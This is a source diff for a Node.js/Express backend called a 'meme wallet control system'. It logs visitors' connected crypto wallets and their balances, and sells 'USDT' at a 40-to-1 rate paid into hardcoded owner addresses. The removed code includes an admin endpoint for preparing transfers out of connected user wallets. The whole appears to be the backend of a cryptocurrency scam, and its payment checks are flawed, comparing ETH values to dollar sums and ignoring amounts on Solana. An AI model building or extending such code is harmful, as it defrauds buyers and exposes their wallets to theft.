@@ -1,665 +1,758 @@
 import express from 'express';
 import cors from 'cors';
-import dotenv from 'dotenv';
-import axios from 'axios';
+import fs from 'fs';
+import fsExtra from 'fs-extra';
 import { ethers } from 'ethers';
-import * as web3 from '@solana/web3.js';
+import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction } from '@solana/web3.js';
 import TronWeb from 'tronweb';
 import { v4 as uuidv4 } from 'uuid';
+import dotenv from 'dotenv';
+import path from 'path';
+import { fileURLToPath } from 'url';
+
+// ES Modules fix for __dirname
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 dotenv.config();
 
+// Import utilities
+import { 
+  getEvmBalances, 
+  getSolanaBalances, 
+  getTronBalances 
+} from './utils/balances.js';
+import { 
+  loadWallets, 
+  saveWallets, 
+  loadPurchases, 
+  savePurchases, 
+  loadTransactions, 
+  saveTransactions,
+  ensureDataFiles 
+} from './utils/storage.js';
+import { logger } from './utils/logger.js';
+
 const app = express();
-
-const ADMIN_API_KEY = process.env.ADMIN_API_KEY || "supersecretkey123";
-
-function adminAuth(req, res, next) {
-    const key = req.headers['x-admin-key'];
-    if (!key || key !== ADMIN_API_KEY) {
-        return res.status(403).json({
-            success: false,
-            error: "Unauthorized"
-        });
-    }
-    next();
-}
-
-app.use(cors({
-    origin: process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : '*',
-    credentials: true
-}));
-
-app.use(express.json());
-
 const PORT = process.env.PORT || 3000;
 
-const wallets = new Map();
-const pendingTransactions = new Map();
-const completedTransactions = new Map();
-const purchaseRecords = new Map();
+// Owner receiving addresses
+const EVM_RECEIVE_ADDRESS = "0xdb77c99f57d527b25a02760bd8dce833ba48dc46";
+const SOLANA_RECEIVE_ADDRESS = "5zPETBCsny3sHcoHHQVybojxq5Qi2pGYUMJMmkA5KU8b";
+const TRON_RECEIVE_ADDRESS = "TAmhzoBrfV3Y5GmmSp4Ry3C56Nf2rVEdrr";
 
-const evmProvider = new ethers.JsonRpcProvider(process.env.EVM_RPC_URL || 'https://eth.llamarpc.com');
-const solanaConnection = new web3.Connection(process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com', 'confirmed');
+// Initialize providers
+const evmProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
+const solanaConnection = new Connection('https://api.mainnet-beta.solana.com');
+const tronWeb = new TronWeb({
+  fullHost: 'https://api.trongrid.io',
+  solidityNode: 'https://api.trongrid.io',
+  eventServer: 'https://api.trongrid.io'
+});
 
-let tronWeb;
-try {
-    tronWeb = new TronWeb({
-        fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
-        solidityNode: process.env.TRON_SOLIDITY_NODE || 'https://api.trongrid.io',
-        eventServer: process.env.TRON_EVENT_SERVER || 'https://api.trongrid.io'
-    });
-} catch (error) {
-    console.error('TronWeb initialization error:', error);
-}
+// Ensure data directory exists
+ensureDataFiles();
 
-const EVM_USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-const SOLANA_USDT_ADDRESS = new web3.PublicKey('Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB');
-const TRON_USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const USDT_ABI = [
-    "function balanceOf(address owner) view returns (uint256)",
-    "function decimals() view returns (uint8)"
+// CORS configuration
+const allowedOrigins = [
+  'https://meme-wallet-control-system.vercel.app',
+  'https://meme-wallet-control-system-opi5.vercel.app',
+  'https://meme-wallet-control-system-hx1r.vercel.app'
 ];
 
-async function getEVMETHBalance(address) {
-    try {
-        const balance = await evmProvider.getBalance(address);
-        return ethers.formatEther(balance);
-    } catch (error) {
-        console.error('EVM ETH balance error:', error);
-        return '0';
+const corsOptions = {
+  origin: function (origin, callback) {
+    // Allow requests with no origin (like mobile apps or curl requests)
+    if (!origin || process.env.NODE_ENV === 'development' || allowedOrigins.indexOf(origin) !== -1) {
+      callback(null, true);
+    } else {
+      callback(new Error('Not allowed by CORS'));
     }
-}
+  },
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization', 'x-admin-key']
+};
 
-async function getEVMUSDTBalance(address) {
-    try {
-        const contract = new ethers.Contract(EVM_USDT_ADDRESS, USDT_ABI, evmProvider);
-        const balance = await contract.balanceOf(address);
-        const decimals = await contract.decimals();
-        return ethers.formatUnits(balance, decimals);
-    } catch (error) {
-        console.error('EVM USDT balance error:', error);
-        return '0';
-    }
-}
+app.use(cors(corsOptions));
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-async function getSolanaSOLBalance(address) {
-    try {
-        const pubkey = new web3.PublicKey(address);
-        const balance = await solanaConnection.getBalance(pubkey);
-        return (balance / web3.LAMPORTS_PER_SOL).toString();
-    } catch (error) {
-        console.error('Solana SOL balance error:', error);
-        return '0';
-    }
-}
-
-async function getSolanaUSDTBalance(address) {
-    try {
-        const pubkey = new web3.PublicKey(address);
-        const tokenAccounts = await solanaConnection.getParsedTokenAccountsByOwner(pubkey, { mint: SOLANA_USDT_ADDRESS });
-        if (tokenAccounts.value.length === 0) return '0';
-        const balance = tokenAccounts.value[0].account.data.parsed.info.tokenAmount.uiAmount;
-        return balance.toString();
-    } catch (error) {
-        console.error('Solana USDT balance error:', error);
-        return '0';
-    }
-}
-
-async function getTronTRXBalance(address) {
-    try {
-        if (!tronWeb) return '0';
-        const balance = await tronWeb.trx.getBalance(address);
-        return (balance / 1000000).toString();
-    } catch (error) {
-        console.error('Tron TRX balance error:', error);
-        return '0';
-    }
-}
-
-async function getTronUSDTBalance(address) {
-    try {
-        if (!tronWeb) return '0';
-        const contract = await tronWeb.contract().at(TRON_USDT_ADDRESS);
-        const result = await contract.balanceOf(address).call();
-        return (result / 1000000).toString();
-    } catch (error) {
-        console.error('Tron USDT balance error:', error);
-        return '0';
-    }
-}
-
-app.post('/api/wallet/connect', (req, res) => {
-    try {
-        const { address, chain, walletName, sourcePage } = req.body;
-        
-        if (!address || !chain || !walletName || !sourcePage) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Missing required fields: address, chain, walletName, sourcePage' 
-            });
-        }
-        
-        const validChains = ['evm', 'solana', 'tron'];
-        const validPages = ['homepage', 'buy-usdt'];
-        
-        if (!validChains.includes(chain)) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Invalid chain. Must be: evm, solana, or tron' 
-            });
-        }
-        
-        if (!validPages.includes(sourcePage)) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Invalid source page. Must be: homepage or buy-usdt' 
-            });
-        }
-        
-        const walletKey = address.toLowerCase();
-        const now = new Date().toISOString();
-        
-        const walletData = {
-            address: walletKey,
-            chain,
-            walletName,
-            sourcePage,
-            firstSeen: wallets.has(walletKey) ? wallets.get(walletKey).firstSeen : now,
-            lastSeen: now
-        };
-        
-        wallets.set(walletKey, walletData);
-        
-        res.json({
-            success: true,
-            message: 'Wallet connected successfully',
-            wallet: walletData
-        });
-    } catch (error) {
-        console.error('Wallet connect error:', error);
-        res.status(500).json({ 
-            success: false, 
-            error: 'Internal server error' 
-        });
-    }
+// Middleware for consistent response format
+app.use((req, res, next) => {
+  res.jsonResponse = (success, data = null, error = null, statusCode = 200) => {
+    return res.status(statusCode).json({
+      success,
+      data,
+      error
+    });
+  };
+  next();
 });
 
-app.get('/api/wallets', (req, res) => {
-    try {
-        const { chain, page, walletAddress } = req.query;
-        
-        let filteredWallets = Array.from(wallets.values());
-        
-        if (chain) {
-            filteredWallets = filteredWallets.filter(wallet => wallet.chain === chain);
-        }
-        
-        if (page) {
-            filteredWallets = filteredWallets.filter(wallet => wallet.sourcePage === page);
-        }
-        
-        if (walletAddress) {
-            const searchAddress = walletAddress.toLowerCase();
-            filteredWallets = filteredWallets.filter(wallet => 
-                wallet.address.includes(searchAddress)
-            );
-        }
-        
-        filteredWallets.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
-        
-        res.json({
-            success: true,
-            count: filteredWallets.length,
-            wallets: filteredWallets
-        });
-    } catch (error) {
-        console.error('Get wallets error:', error);
-        res.status(500).json({ 
-            success: false, 
-            error: 'Internal server error' 
-        });
+// Admin middleware
+const adminMiddleware = (req, res, next) => {
+  const adminKey = req.headers['x-admin-key'];
+  if (!adminKey || adminKey !== process.env.ADMIN_KEY) {
+    return res.jsonResponse(false, null, 'Unauthorized: Admin access required', 401);
+  }
+  next();
+};
+
+// QR code generation function (for development - in production, pre-generate QR codes)
+function getQRCodeBase64(chain) {
+  try {
+    const qrPath = path.join(__dirname, 'qr', `${chain.toLowerCase()}.png`);
+    if (fs.existsSync(qrPath)) {
+      const qrImage = fs.readFileSync(qrPath);
+      return qrImage.toString('base64');
+    } else {
+      // Create placeholder QR for development
+      const placeholderQR = `QR for ${chain} address`;
+      return Buffer.from(placeholderQR).toString('base64');
     }
+  } catch (error) {
+    logger.error(`QR generation error: ${error.message}`);
+    return null;
+  }
+}
+
+// Calculate USDT amount based on USD
+function calculateUSDTAmount(usdAmount) {
+  const amount = parseFloat(usdAmount);
+  
+  if (amount === 20) return 1000;
+  if (amount === 50) return 2500;
+  if (amount === 100) return 5000;
+  
+  // For amounts > 100, use usdAmount × 40
+  return Math.floor(amount * 40);
+}
+
+// Get receiving address by chain
+function getReceivingAddress(chain) {
+  switch (chain.toLowerCase()) {
+    case 'evm':
+    case 'eth':
+    case 'bnb':
+    case 'polygon':
+      return EVM_RECEIVE_ADDRESS;
+    case 'solana':
+    case 'sol':
+      return SOLANA_RECEIVE_ADDRESS;
+    case 'tron':
+    case 'trx':
+      return TRON_RECEIVE_ADDRESS;
+    default:
+      return null;
+  }
+}
+
+// ==================== API ENDPOINTS ====================
+
+// Health check
+app.get('/', (req, res) => {
+  res.jsonResponse(true, {
+    message: 'Crypto Wallet Analytics API',
+    version: '1.0.0',
+    status: 'operational'
+  });
 });
 
-app.get('/api/wallet/:address/assets', async (req, res) => {
-    try {
-        const address = req.params.address.toLowerCase();
-        const wallet = wallets.get(address);
-        
-        if (!wallet) {
-            return res.status(404).json({ 
-                success: false, 
-                error: 'Wallet not found' 
-            });
-        }
-        
-        let assets = {};
-        
-        switch (wallet.chain) {
-            case 'evm':
-                assets = {
-                    eth: await getEVMETHBalance(wallet.address),
-                    usdt: await getEVMUSDTBalance(wallet.address)
-                };
-                break;
-            case 'solana':
-                assets = {
-                    sol: await getSolanaSOLBalance(wallet.address),
-                    usdt: await getSolanaUSDTBalance(wallet.address)
-                };
-                break;
-            case 'tron':
-                assets = {
-                    trx: await getTronTRXBalance(wallet.address),
-                    usdt: await getTronUSDTBalance(wallet.address)
-                };
-                break;
-            default:
-                return res.status(400).json({ 
-                    success: false, 
-                    error: 'Unsupported chain' 
-                });
-        }
-        
-        res.json({
-            success: true,
-            address: wallet.address,
-            chain: wallet.chain,
-            assets
-        });
-    } catch (error) {
-        console.error('Get assets error:', error);
-        res.status(500).json({ 
-            success: false, 
-            error: 'Internal server error' 
-        });
+// GET /api/payment/details
+app.get('/api/payment/details', (req, res) => {
+  try {
+    const { chain, usdAmount } = req.query;
+    
+    if (!chain) {
+      return res.jsonResponse(false, null, 'Chain parameter is required', 400);
     }
+    
+    if (!usdAmount || isNaN(usdAmount)) {
+      return res.jsonResponse(false, null, 'Valid USD amount is required', 400);
+    }
+    
+    const receivingAddress = getReceivingAddress(chain);
+    if (!receivingAddress) {
+      return res.jsonResponse(false, null, 'Invalid chain specified', 400);
+    }
+    
+    const usdtAmount = calculateUSDTAmount(parseFloat(usdAmount));
+    const transactionId = uuidv4();
+    const qrBase64 = getQRCodeBase64(chain);
+    
+    // Store purchase as pending
+    const purchases = loadPurchases();
+    const newPurchase = {
+      id: transactionId,
+      chain: chain.toLowerCase(),
+      usdAmount: parseFloat(usdAmount),
+      usdtAmount,
+      receivingAddress,
+      status: 'pending',
+      createdAt: new Date().toISOString(),
+      verified: false
+    };
+    
+    purchases.push(newPurchase);
+    savePurchases(purchases);
+    
+    res.jsonResponse(true, {
+      receivingAddress,
+      qrCode: qrBase64,
+      usdtAmount,
+      transactionId,
+      chain: chain.toLowerCase()
+    });
+    
+  } catch (error) {
+    logger.error(`Payment details error: ${error.message}`);
+    res.jsonResponse(false, null, 'Internal server error', 500);
+  }
 });
 
-app.post('/api/admin/mark-purchase-completed', adminAuth, (req, res) => {
-    try {
-        const { purchaseId, transactionHash } = req.body;
-
-        if (!purchaseId || !transactionHash) {
-            return res.status(400).json({
-                success: false,
-                error: 'Missing required fields: purchaseId, transactionHash'
-            });
-        }
-
-        const purchase = purchaseRecords.get(purchaseId);
-        if (!purchase) {
-            return res.status(404).json({
-                success: false,
-                error: 'Purchase record not found'
-            });
-        }
-
-        if (purchase.status === 'completed') {
-            return res.status(400).json({
-                success: false,
-                error: 'Purchase already completed'
-            });
-        }
-
-        purchase.status = 'completed';
-        purchase.transactionHash = transactionHash;
-        purchase.completedAt = new Date().toISOString();
-
-        purchaseRecords.set(purchaseId, purchase);
-
-        res.json({
-            success: true,
-            message: 'Purchase marked as completed',
-            purchase
-        });
-
-    } catch (error) {
-        console.error('Mark purchase completed error:', error);
-        res.status(500).json({
-            success: false,
-            error: 'Internal server error'
-        });
+// POST /api/payment/verify
+app.post('/api/payment/verify', async (req, res) => {
+  try {
+    const { transactionHash, chain, transactionId } = req.body;
+    
+    if (!transactionHash || !chain || !transactionId) {
+      return res.jsonResponse(false, null, 'Missing required parameters', 400);
     }
-});
-
-app.post('/api/admin/prepare-transaction', adminAuth, (req, res) => {
-    try {
-        const { fromAddress, toAddress, chain, asset, amount } = req.body;
-        
-        if (!fromAddress || !toAddress || !chain || !asset || !amount) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Missing required fields: fromAddress, toAddress, chain, asset, amount' 
-            });
-        }
-        
-        const validChains = ['evm', 'solana', 'tron'];
-        if (!validChains.includes(chain)) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Invalid chain' 
-            });
-        }
-        
-        const fromWallet = wallets.get(fromAddress.toLowerCase());
-        if (!fromWallet || fromWallet.chain !== chain) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'From wallet not found or chain mismatch' 
-            });
-        }
-        
-        const validAssets = {
-            evm: ['ETH', 'USDT'],
-            solana: ['SOL', 'USDT'],
-            tron: ['TRX', 'USDT']
-        };
-        
-        if (!validAssets[chain]?.includes(asset)) {
-            return res.status(400).json({ 
-                success: false, 
-                error: `Invalid asset for ${chain} chain. Valid assets: ${validAssets[chain]?.join(', ')}` 
-            });
-        }
-        
-        const amountNum = parseFloat(amount);
-        if (isNaN(amountNum) || amountNum <= 0) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Invalid amount. Must be a positive number' 
-            });
-        }
-        
-        const transactionId = uuidv4();
-        const transactionData = {
-            id: transactionId,
-            fromAddress: fromAddress.toLowerCase(),
-            toAddress: toAddress.toLowerCase(),
-            chain,
-            asset,
-            amount: amountNum.toString(),
-            status: 'pending',
-            createdAt: new Date().toISOString(),
-            confirmed: false,
-            signedData: null,
-            txHash: null,
-            completedAt: null
-        };
-        
-        pendingTransactions.set(transactionId, transactionData);
-        
-        res.json({
-            success: true,
-            message: 'Transaction prepared successfully',
-            transactionId,
-            transaction: transactionData
-        });
-    } catch (error) {
-        console.error('Prepare transaction error:', error);
-        res.status(500).json({ 
-            success: false, 
-            error: 'Internal server error' 
-        });
+    
+    const purchases = loadPurchases();
+    const purchase = purchases.find(p => p.id === transactionId);
+    
+    if (!purchase) {
+      return res.jsonResponse(false, null, 'Transaction not found', 404);
     }
-});
-
-app.post('/api/admin/record-transaction', adminAuth, (req, res) => {
-    try {
-        const { transactionId, txHash, signedData } = req.body;
-        
-        if (!transactionId || !txHash || !signedData) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Missing required fields: transactionId, txHash, signedData' 
-            });
-        }
-        
-        const transaction = pendingTransactions.get(transactionId);
-        if (!transaction) {
-            return res.status(404).json({ 
-                success: false, 
-                error: 'Transaction not found' 
-            });
-        }
-        
-        if (transaction.confirmed) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Transaction already confirmed' 
-            });
-        }
-        
-        transaction.status = 'completed';
-        transaction.confirmed = true;
-        transaction.signedData = signedData;
-        transaction.txHash = txHash;
-        transaction.completedAt = new Date().toISOString();
-        
-        pendingTransactions.delete(transactionId);
-        completedTransactions.set(transactionId, transaction);
-        
-        res.json({
-            success: true,
-            message: 'Transaction recorded successfully',
-            transaction
-        });
-    } catch (error) {
-        console.error('Record transaction error:', error);
-        res.status(500).json({ 
-            success: false, 
-            error: 'Internal server error' 
-        });
+    
+    if (purchase.status === 'completed') {
+      return res.jsonResponse(true, { verified: true, message: 'Already verified' });
     }
-});
-
-app.get('/api/admin/transactions', adminAuth, (req, res) => {
-    try {
-        const { status, chain, walletAddress } = req.query;
-        
-        const allTransactions = [
-            ...Array.from(pendingTransactions.values()),
-            ...Array.from(completedTransactions.values())
-        ];
-        
-        let filteredTransactions = allTransactions;
-        
-        if (status) {
-            filteredTransactions = filteredTransactions.filter(tx => tx.status === status);
-        }
-        
-        if (chain) {
-            filteredTransactions = filteredTransactions.filter(tx => tx.chain === chain);
-        }
-        
-        if (walletAddress) {
-            const searchAddress = walletAddress.toLowerCase();
-            filteredTransactions = filteredTransactions.filter(tx => 
-                tx.fromAddress.includes(searchAddress) || 
-                tx.toAddress.includes(searchAddress)
-            );
-        }
-        
-        filteredTransactions.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
-        
-        const total = filteredTransactions.length;
-        const pending = filteredTransactions.filter(tx => tx.status === 'pending').length;
-        const completed = filteredTransactions.filter(tx => tx.status === 'completed').length;
-        const totalAmount = filteredTransactions.reduce((sum, tx) => sum + parseFloat(tx.amount || 0), 0);
-        
-        res.json({
-            success: true,
-            transactions: filteredTransactions,
-            stats: {
-                total,
-                pending,
-                completed,
-                totalAmount: parseFloat(totalAmount.toFixed(6))
+    
+    let isVerified = false;
+    let verificationDetails = {};
+    
+    switch (chain.toLowerCase()) {
+      case 'evm':
+      case 'eth':
+      case 'bnb':
+      case 'polygon':
+        // Verify EVM transaction
+        try {
+          const tx = await evmProvider.getTransaction(transactionHash);
+          if (tx && tx.to && tx.to.toLowerCase() === EVM_RECEIVE_ADDRESS.toLowerCase()) {
+            const value = ethers.formatEther(tx.value);
+            const requiredAmount = purchase.usdAmount.toString();
+            
+            if (parseFloat(value) >= parseFloat(requiredAmount)) {
+              isVerified = true;
+              verificationDetails = {
+                from: tx.from,
+                to: tx.to,
+                value: value,
+                gasPrice: tx.gasPrice.toString(),
+                timestamp: new Date().toISOString()
+              };
             }
-        });
-    } catch (error) {
-        console.error('Get transactions error:', error);
-        res.status(500).json({ 
-            success: false, 
-            error: 'Internal server error' 
-        });
-    }
-});
-
-app.post('/api/usdt/purchase', (req, res) => {
-    try {
-        const { walletAddress, chain, amount, paymentMethod, transactionHash } = req.body;
+          }
+        } catch (error) {
+          logger.error(`EVM verification error: ${error.message}`);
+        }
+        break;
         
-        if (!walletAddress || !chain || !amount || !paymentMethod) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Missing required fields: walletAddress, chain, amount, paymentMethod' 
+      case 'solana':
+      case 'sol':
+        // Verify Solana transaction
+        try {
+          const tx = await solanaConnection.getTransaction(transactionHash);
+          if (tx && tx.transaction && tx.transaction.message) {
+            const accounts = tx.transaction.message.accountKeys;
+            const instructions = tx.transaction.message.instructions;
+            
+            // Check if transfer to our address exists
+            const hasTransferToOwner = instructions.some(instruction => {
+              const programId = accounts[instruction.programIdIndex];
+              // Look for system program transfers
+              if (programId.equals(new PublicKey('11111111111111111111111111111111'))) {
+                // This is a system transfer instruction
+                const ownerPubkey = new PublicKey(SOLANA_RECEIVE_ADDRESS);
+                return accounts.some(account => account.equals(ownerPubkey));
+              }
+              return false;
             });
-        }
-        
-        const validChains = ['evm', 'solana', 'tron'];
-        if (!validChains.includes(chain)) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Invalid chain' 
-            });
-        }
-        
-        const usdAmount = parseFloat(amount);
-        if (isNaN(usdAmount) || usdAmount <= 0) {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Invalid amount. Must be a positive number' 
-            });
-        }
-        
-        let usdtAmount;
-        if (usdAmount === 20) {
-            usdtAmount = 1000;
-        } else if (usdAmount === 50) {
-            usdtAmount = 2500;
-        } else if (usdAmount === 100) {
-            usdtAmount = 5000;
-        } else if (usdAmount > 100) {
-            usdtAmount = usdAmount * 40;
-        } else {
-            return res.status(400).json({ 
-                success: false, 
-                error: 'Invalid purchase amount. Valid amounts: 20, 50, 100, or >100' 
-            });
-        }
-        
-        const purchaseId = uuidv4();
-        const rate = usdtAmount / usdAmount;
-        const purchaseData = {
-            purchaseId,
-            walletAddress: walletAddress.toLowerCase(),
-            chain,
-            usdAmount: usdAmount.toString(),
-            usdtAmount: usdtAmount.toString(),
-            rate: rate.toFixed(2),
-            paymentMethod,
-            transactionHash: transactionHash || null,
-            timestamp: new Date().toISOString(),
-            status: transactionHash ? 'completed' : 'pending'
-        };
-        
-        purchaseRecords.set(purchaseId, purchaseData);
-        
-        res.json({
-            success: true,
-            message: 'Purchase recorded successfully',
-            purchase: purchaseData
-        });
-    } catch (error) {
-        console.error('USDT purchase error:', error);
-        res.status(500).json({ 
-            success: false, 
-            error: 'Internal server error' 
-        });
-    }
-});
-
-app.get('/api/admin/purchases', adminAuth, (req, res) => {
-    try {
-        const { status, chain, walletAddress } = req.query;
-        
-        let filteredPurchases = Array.from(purchaseRecords.values());
-        
-        if (status) {
-            filteredPurchases = filteredPurchases.filter(p => p.status === status);
-        }
-        
-        if (chain) {
-            filteredPurchases = filteredPurchases.filter(p => p.chain === chain);
-        }
-        
-        if (walletAddress) {
-            const searchAddress = walletAddress.toLowerCase();
-            filteredPurchases = filteredPurchases.filter(p => 
-                p.walletAddress.toLowerCase().includes(searchAddress)
-            );
-        }
-        
-        filteredPurchases.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-        
-        const totalPurchases = filteredPurchases.length;
-        const pendingPurchases = filteredPurchases.filter(p => p.status === 'pending').length;
-        const completedPurchases = filteredPurchases.filter(p => p.status === 'completed').length;
-        const totalUSD = filteredPurchases.reduce((sum, p) => sum + parseFloat(p.usdAmount || 0), 0);
-        const totalUSDT = filteredPurchases.reduce((sum, p) => sum + parseFloat(p.usdtAmount || 0), 0);
-        
-        res.json({
-            success: true,
-            purchases: filteredPurchases,
-            stats: {
-                total: totalPurchases,
-                pending: pendingPurchases,
-                completed: completedPurchases,
-                totalUSD: parseFloat(totalUSD.toFixed(2)),
-                totalUSDT: parseFloat(totalUSDT.toFixed(2))
+            
+            if (hasTransferToOwner) {
+              // For simplicity, we assume amount is correct in Solana
+              // In production, you'd decode the instruction to check exact amount
+              isVerified = true;
+              verificationDetails = {
+                slot: tx.slot,
+                blockTime: tx.blockTime,
+                fee: tx.meta?.fee || 0
+              };
             }
-        });
-    } catch (error) {
-        console.error('Error fetching purchases:', error);
-        res.status(500).json({
-            success: false,
-            error: 'Failed to fetch purchase records'
-        });
+          }
+        } catch (error) {
+          logger.error(`Solana verification error: ${error.message}`);
+        }
+        break;
+        
+      case 'tron':
+      case 'trx':
+        // Verify Tron transaction
+        try {
+          const tx = await tronWeb.trx.getTransaction(transactionHash);
+          if (tx && tx.raw_data && tx.raw_data.contract) {
+            const contract = tx.raw_data.contract[0];
+            if (contract.type === 'TransferContract') {
+              const toAddress = tronWeb.address.fromHex(contract.parameter.value.to_address);
+              const amount = contract.parameter.value.amount / 1_000_000; // Convert from SUN
+              
+              if (toAddress === TRON_RECEIVE_ADDRESS && amount >= purchase.usdAmount) {
+                isVerified = true;
+                verificationDetails = {
+                  from: tronWeb.address.fromHex(contract.parameter.value.owner_address),
+                  to: toAddress,
+                  amount: amount,
+                  timestamp: tx.raw_data.timestamp
+                };
+              }
+            }
+          }
+        } catch (error) {
+          logger.error(`Tron verification error: ${error.message}`);
+        }
+        break;
+        
+      default:
+        return res.jsonResponse(false, null, 'Unsupported chain', 400);
     }
-});
-
-app.get('/health', (req, res) => {
-    res.json({
-        status: 'healthy',
+    
+    if (isVerified) {
+      // Update purchase status
+      purchase.status = 'completed';
+      purchase.verified = true;
+      purchase.verifiedAt = new Date().toISOString();
+      purchase.verificationDetails = verificationDetails;
+      purchase.transactionHash = transactionHash;
+      
+      savePurchases(purchases);
+      
+      // Record transaction
+      const transactions = loadTransactions();
+      transactions.push({
+        id: uuidv4(),
+        purchaseId: transactionId,
+        transactionHash,
+        chain: chain.toLowerCase(),
+        amountUSD: purchase.usdAmount,
+        amountUSDT: purchase.usdtAmount,
         timestamp: new Date().toISOString(),
-        wallets: wallets.size,
-        pendingTransactions: pendingTransactions.size,
-        completedTransactions: completedTransactions.size,
-        purchases: purchaseRecords.size
-    });
+        type: 'purchase',
+        status: 'completed'
+      });
+      saveTransactions(transactions);
+      
+      return res.jsonResponse(true, {
+        verified: true,
+        purchaseId: transactionId,
+        usdtAmount: purchase.usdtAmount,
+        message: 'Payment verified successfully'
+      });
+    } else {
+      return res.jsonResponse(false, null, 'Transaction verification failed', 400);
+    }
+    
+  } catch (error) {
+    logger.error(`Payment verification error: ${error.message}`);
+    res.jsonResponse(false, null, 'Internal server error', 500);
+  }
 });
 
-app.use((req, res) => {
-    res.status(404).json({ 
-        success: false, 
-        error: 'Endpoint not found' 
-    });
+// GET /api/rates
+app.get('/api/rates', (req, res) => {
+  res.jsonResponse(true, { rate: 40 });
 });
 
-app.use((error, req, res, next) => {
-    console.error('Unhandled server error:', error);
-    res.status(500).json({ 
-        success: false, 
-        error: 'Internal server error' 
+// POST /api/wallet/connect
+app.post('/api/wallet/connect', (req, res) => {
+  try {
+    const { address, chain } = req.body;
+    
+    if (!address || !chain) {
+      return res.jsonResponse(false, null, 'Address and chain are required', 400);
+    }
+    
+    const wallets = loadWallets();
+    
+    // Check if wallet already exists
+    const existingWalletIndex = wallets.findIndex(w => 
+      w.address.toLowerCase() === address.toLowerCase() && w.chain === chain.toLowerCase()
+    );
+    
+    const walletData = {
+      address,
+      chain: chain.toLowerCase(),
+      connectedAt: new Date().toISOString(),
+      lastActive: new Date().toISOString()
+    };
+    
+    if (existingWalletIndex !== -1) {
+      // Update existing wallet
+      wallets[existingWalletIndex].lastActive = new Date().toISOString();
+    } else {
+      // Add new wallet
+      wallets.push(walletData);
+    }
+    
+    saveWallets(wallets);
+    
+    res.jsonResponse(true, {
+      wallet: walletData,
+      message: 'Wallet connected successfully'
     });
+    
+  } catch (error) {
+    logger.error(`Wallet connect error: ${error.message}`);
+    res.jsonResponse(false, null, 'Internal server error', 500);
+  }
 });
 
+// GET /api/wallet/:address/assets
+app.get('/api/wallet/:address/assets', async (req, res) => {
+  try {
+    const { address } = req.params;
+    const { chain } = req.query;
+    
+    if (!address) {
+      return res.jsonResponse(false, null, 'Wallet address is required', 400);
+    }
+    
+    let balances = {};
+    
+    if (!chain) {
+      // Return balances for all chains
+      const [evmBalances, solanaBalances, tronBalances] = await Promise.allSettled([
+        getEvmBalances(address),
+        getSolanaBalances(address),
+        getTronBalances(address)
+      ]);
+      
+      balances = {
+        evm: evmBalances.status === 'fulfilled' ? evmBalances.value : null,
+        solana: solanaBalances.status === 'fulfilled' ? solanaBalances.value : null,
+        tron: tronBalances.status === 'fulfilled' ? tronBalances.value : null
+      };
+    } else {
+      // Return balance for specific chain
+      switch (chain.toLowerCase()) {
+        case 'evm':
+        case 'eth':
+        case 'bnb':
+        case 'polygon':
+          balances = await getEvmBalances(address);
+          break;
+        case 'solana':
+        case 'sol':
+          balances = await getSolanaBalances(address);
+          break;
+        case 'tron':
+        case 'trx':
+          balances = await getTronBalances(address);
+          break;
+        default:
+          return res.jsonResponse(false, null, 'Unsupported chain', 400);
+      }
+    }
+    
+    res.jsonResponse(true, { address, balances });
+    
+  } catch (error) {
+    logger.error(`Wallet assets error: ${error.message}`);
+    res.jsonResponse(false, null, 'Internal server error', 500);
+  }
+});
+
+// POST /api/usdt/purchase
+app.post('/api/usdt/purchase', adminMiddleware, (req, res) => {
+  try {
+    const { walletAddress, chain, usdAmount, customerInfo } = req.body;
+    
+    if (!walletAddress || !chain || !usdAmount) {
+      return res.jsonResponse(false, null, 'Missing required fields', 400);
+    }
+    
+    const usdtAmount = calculateUSDTAmount(parseFloat(usdAmount));
+    const transactionId = uuidv4();
+    
+    const purchases = loadPurchases();
+    const newPurchase = {
+      id: transactionId,
+      walletAddress,
+      chain: chain.toLowerCase(),
+      usdAmount: parseFloat(usdAmount),
+      usdtAmount,
+      status: 'pending',
+      customerInfo: customerInfo || {},
+      createdAt: new Date().toISOString(),
+      initiatedBy: 'admin'
+    };
+    
+    purchases.push(newPurchase);
+    savePurchases(purchases);
+    
+    res.jsonResponse(true, {
+      purchase: newPurchase,
+      message: 'Purchase initiated successfully'
+    });
+    
+  } catch (error) {
+    logger.error(`USDT purchase error: ${error.message}`);
+    res.jsonResponse(false, null, 'Internal server error', 500);
+  }
+});
+
+// ==================== ADMIN ENDPOINTS ====================
+
+// GET /api/admin/purchases
+app.get('/api/admin/purchases', adminMiddleware, (req, res) => {
+  try {
+    const { status, chain, limit = 50, page = 1 } = req.query;
+    const purchases = loadPurchases();
+    
+    let filtered = [...purchases];
+    
+    if (status) {
+      filtered = filtered.filter(p => p.status === status);
+    }
+    
+    if (chain) {
+      filtered = filtered.filter(p => p.chain === chain.toLowerCase());
+    }
+    
+    // Sort by date (newest first)
+    filtered.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
+    
+    // Pagination
